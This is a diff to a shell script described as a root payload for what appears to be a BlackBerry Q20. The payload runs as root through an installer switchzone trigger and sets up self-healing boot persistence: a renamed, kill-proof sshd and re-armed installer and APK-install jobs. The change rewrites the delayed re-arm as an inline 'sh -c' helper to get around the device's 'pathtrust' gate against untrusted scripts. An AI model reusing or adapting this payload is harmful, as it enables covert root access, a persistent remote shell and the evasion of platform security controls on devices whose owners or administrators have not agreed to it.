@@ -1,5 +1,5 @@
 #!/bin/sh
-# q20 root payload v8: self-healing boot persistence (v7 + delayed sz re-arm).
+# q20 root payload v8.1: self-healing boot persistence (v8: delayed re-arm inline via sh -c - no untrusted-script exec).
 # Runs as root via the switchzone trigger (carrier = ls-oom-adj.sh).
 # Each run: kill-proof sshd (trusted inode, renamed), re-arms the three
 # persisted installer jobs fresh for the next boot, rebuilds the unpack
@@ -63,14 +63,18 @@ EOF
   chmod 664 "$P"/job.q20* 2>/dev/null
   rm -f /pps/system/installer/upd/current/job.q20sz0 /pps/system/installer/upd/current/job.q20sz1 2>/dev/null
 
-  # 4. delayed re-arm of the sz jobs: deckard consumes switchzone jobs at
-  #    fire time, and a mid-sz re-write gets clobbered by the pps live-object
-  #    sync. A detached helper (interpreter-mediated, survives the sz
-  #    cleanup like the renamed sshd does) re-writes them 90s later, when
-  #    the live objects are gone.
-  cat > /accounts/devuser/q20rearm.sh <<'EOF'
-sleep 90
+  # 4. delayed re-arm (sh -c inline - no untrusted-script exec, which the
+  #    pathtrust gate denies): deckard consumes the switchzone jobs at fire
+  #    time AND re-consumes same-boot re-writes of the install job, so a
+  #    detached helper re-writes ALL THREE 90s post-boot, after the queue
+  #    settles.
+  sh -c 'sleep 90
 P=/var/pps/system@0.0.775/installer@88.88.755/upd@88.88.755/current@88.88.2775
+cat > "$P/job.q20final@0.88.664" <<EOT
+action::install_apk
+package_location::/var/android/q20final
+extras::source::apk
+EOT
 cat > "$P/job.q20sz0@0.88.664" <<EOT
 @sz
 action::switchzone
@@ -83,10 +87,8 @@ action::switchzone
 session::1
 zone:json:{"radio":"true","os":"true"}
 EOT
-chown pps:pps "$P"/job.q20sz0@0.88.664 "$P"/job.q20sz1@0.88.664
-chmod 664 "$P"/job.q20sz0@0.88.664 "$P"/job.q20sz1@0.88.664
-EOF
-  sh /accounts/devuser/q20rearm.sh &
+chown pps:pps "$P"/job.q20final@0.88.664 "$P"/job.q20sz0@0.88.664 "$P"/job.q20sz1@0.88.664
+chmod 664 "$P"/job.q20final@0.88.664 "$P"/job.q20sz0@0.88.664 "$P"/job.q20sz1@0.88.664' &
 
   echo done > /tmp/q20-rooted
   echo "== payload v8 finished =="
